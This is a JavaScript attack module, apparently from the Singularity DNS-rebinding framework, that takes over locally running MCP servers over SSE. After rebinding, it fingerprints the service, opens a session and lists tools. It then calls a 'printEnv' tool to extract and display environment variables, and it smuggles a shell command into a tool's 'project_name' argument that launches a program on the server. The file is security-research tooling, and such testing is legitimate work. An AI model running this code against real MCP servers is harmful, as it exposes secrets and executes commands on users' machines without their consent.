/**
 * Model Context Protocol (MCP) over HTTP with Server-Sent Events (SSE) via DNS rebinding
 * Implements the MCP SSE transport as defined in:
 * https://modelcontextprotocol.io/specification/2024-11-05/basic/transports
 * 
 * SSE Transport Flow:
 * 1. Client connects to SSE endpoint to receive server messages
 * 2. Server sends 'endpoint' event with URI for client messages
 * 3. Client sends messages via HTTP POST to the endpoint URI
 * 4. Server sends responses via SSE 'message' events
 */

const McpSse = () => {

	// JSON-RPC message ID counter
	let rpcId = 1;
	let sessionEndpoint = null;
	let eventSource = null;
	let messageHandlers = new Map();

	function nextId() { return rpcId++; }

	function jsonrpc(method, params) {
		return {
			jsonrpc: "2.0",
			id: nextId(),
			method,
			params: params || {}
		};
	}

	// Parse MCP response (handles SSE data format)
	function parseMcpResponse(text) {
		let resp;
		try {
			resp = JSON.parse(text);
		} catch (_e) { }
		return resp;
	}

	// Send a message to the MCP server via POST
	async function sendMessage(message) {
		if (!sessionEndpoint) {
			throw new Error('No session endpoint available');
		}

		const response = await sooFetch(sessionEndpoint, {
			method: 'POST',
			credentials: 'omit',
			headers: {
				'content-type': 'application/json',
				'accept': 'application/json'
			},
			body: JSON.stringify(message)
		});

		return response;
	}

	// Send a message and wait for the response
	async function sendAndWaitForResponse(message, timeoutMs = 5000) {
		return new Promise((resolve, reject) => {
			const messageId = message.id;
			const timeoutId = setTimeout(() => {
				messageHandlers.delete(messageId);
				reject(new Error('Message response timeout'));
			}, timeoutMs);

			messageHandlers.set(messageId, (response) => {
				clearTimeout(timeoutId);
				messageHandlers.delete(messageId);
				resolve(response);
			});

			sendMessage(message).catch(reject);
		});
	}

	// Invoked after DNS rebinding has been performed
	async function attack(_headers, _cookie, _body, _wsProxyPort) {
		try {
			console.log('Starting MCP SSE attack...');
			
			// Connect to SSE endpoint
			const sseEndpoint = "/sse";
			console.log(`Connecting to SSE endpoint: ${sseEndpoint}`);
			
			// Establish SSE connection
			eventSource = new EventSource(sseEndpoint);
			
			// Wait for the endpoint event
			const endpointPromise = new Promise((resolve, reject) => {
				const timeout = setTimeout(() => {
					reject(new Error('Timeout waiting for endpoint'));
				}, 10000);

				eventSource.addEventListener('endpoint', (event) => {
					clearTimeout(timeout);
					sessionEndpoint = event.data;
					console.log(`Received session endpoint: ${sessionEndpoint}`);
					resolve();
				});

				eventSource.addEventListener('message', (event) => {
					try {
						const response = parseMcpResponse(event.data);
						if (response && response.id && messageHandlers.has(response.id)) {
							messageHandlers.get(response.id)(response);
						} else {
							console.log('Received server message:', response);
						}
					} catch (_e) {
						console.log('Received raw message:', event.data);
					}
				});

				eventSource.onerror = (error) => {
					console.log('SSE connection error:', error);
					console.log('\tEventSource readyState:', eventSource.readyState);
					console.log('\tEventSource URL:', eventSource.url);
					
					// ReadyState values: 0 = CONNECTING, 1 = OPEN, 2 = CLOSED
					const stateNames = ['CONNECTING', 'OPEN', 'CLOSED'];
					console.log(`\tEventSource state: ${stateNames[eventSource.readyState] || 'UNKNOWN'}`);
					
					if (error.status) {
						console.log(`\tHTTP Status: ${error.status} ${error.message || ''}`);
					}
					
					if (eventSource.readyState === EventSource.CLOSED) {
						console.log('\tSSE connection has been closed');
					}
				};
			});

			await endpointPromise;

			// Initialize MCP session
			console.log('Initializing MCP session...');
			const initReq = jsonrpc("initialize", {
				protocolVersion: "2024-11-05",
				capabilities: {},
				clientInfo: {
					name: "singularity",
					version: "0.0.1"
				}
			});

			const initResp = await sendAndWaitForResponse(initReq, 10000);
			
			if (!initResp || initResp.error) {
				console.log('MCP init failed:', initResp?.error || 'No response');
				return;
			}

			console.log('MCP initialize OK:', initResp);

			// IMPORTANT: Wait for initialization to complete before sending any other requests
			// Send initialized notification (this completes the initialization handshake)
			try {
				const initializedReq = {
					jsonrpc: "2.0",
					method: "notifications/initialized",
					params: {}
				};
				await sendMessage(initializedReq);
				console.log('Sent initialized notification');
				
				// Give the server a moment to process the notification
				await new Promise(resolve => setTimeout(resolve, 100));
			} catch (_e) {
				console.log('initialized notification failed:', _e.message);
			}

			// Try to list available functionality
			const methods = ["resources/list", "prompts/list", "tools/list"];
			
			for (const method of methods) {
				try {
					console.log(`Trying ${method}...`);
					const methodReq = jsonrpc(method, {});
					const methodResp = await sendAndWaitForResponse(methodReq);

					if (methodResp && !methodResp.error) {
						console.log(`MCP ${method}:`, methodResp);
					} else {
						console.log(`MCP ${method} failed:`, methodResp?.error || 'No response');
					}
				} catch (_e) {
					console.log(`MCP ${method} error:`, _e.message);
				}
			}

			// Try to demonstrate impact with printEnv tool
			console.log('Attempting to demonstrate impact with printEnv tool...');
			try {
				const printEnvReq = jsonrpc("tools/call", {
					name: "printEnv",
					arguments: {},
					_meta: {
						progressToken: 0
					}
				});
				
				const printEnvResp = await sendAndWaitForResponse(printEnvReq, 10000);
				
				if (printEnvResp && !printEnvResp.error) {
					console.log('🎉 IMPACT DEMONSTRATED - printEnv tool executed successfully!');
					
					// Parse and display environment variables
					if (printEnvResp.result?.content?.[0]?.text) {
						try {
							const envVars = JSON.parse(printEnvResp.result.content[0].text);
							console.log(`📊 Extracted ${Object.keys(envVars).length} environment variables:`);
							
							// Create console table of environment variables
							console.table(envVars);
							
						} catch (_e) {
							console.log('📄 Raw environment data (unparseable JSON):');
							console.log(printEnvResp.result.content[0].text.substring(0, 500) + '...');
						}
					}
				} else {
					console.log('printEnv tool failed:', printEnvResp?.error || 'No response');
				}
			} catch (_e) {
				console.log('printEnv tool error:', _e.message);
			}

			// Exploit command injection vulnerability in check_if_oss_fuzz_project_builds tool
			console.log('Attempting command injection exploit via check_if_oss_fuzz_project_builds tool...');
			try {
				const exploitReq = jsonrpc("tools/call", {
					name: "check_if_oss_fuzz_project_builds",
					arguments: {
						project_name: "test; python3 -c \"import subprocess; subprocess.run(['open', '-a', 'Calculator'])\""
					},
					_meta: {
						progressToken: 0
					}
				});
				
				const exploitResp = await sendAndWaitForResponse(exploitReq, 10000);
				
				if (exploitResp && !exploitResp.error) {
					console.log('💥 COMMAND INJECTION EXPLOIT SUCCEEDED!');
					console.log('Calculator app should have opened on the server');
					console.log('Exploit response:', exploitResp);
				} else {
					console.log('Command injection exploit failed (tool may not exist):', exploitResp?.error || 'No response');
				}
			} catch (_e) {
				console.log('Command injection exploit error:', _e.message);
			}

		} catch (e) {
			console.log(`MCP SSE attack error: ${e}`);
		} finally {
			// Clean up SSE connection
			if (eventSource) {
				eventSource.close();
				console.log('SSE connection closed');
			}
		}
	}

	// Invoked to determine whether the rebinded service is likely MCP SSE
	async function isService(_headers, _cookie, _body) {
		// Heuristic: Try to connect to SSE endpoint and check for 'endpoint' event
		try {
			return new Promise((resolve) => {
				const timeout = setTimeout(() => {
					if (testEventSource) {
						testEventSource.close();
					}
					resolve(false);
				}, 3000);

				const testEventSource = new EventSource('/sse');
				
				testEventSource.addEventListener('endpoint', (event) => {
					clearTimeout(timeout);
					testEventSource.close();
					// Check if the endpoint data looks like a valid MCP endpoint
					const isValid = event.data && event.data.includes('sessionId');
					resolve(isValid);
				});

				testEventSource.onerror = () => {
					clearTimeout(timeout);
					testEventSource.close();
					resolve(false);
				};
			});
		} catch (_e) {
			return false;
		}
	}

	return { attack, isService };
}

// Registry value and manager-config.json value must match
Registry["MCP SSE"] = McpSse();

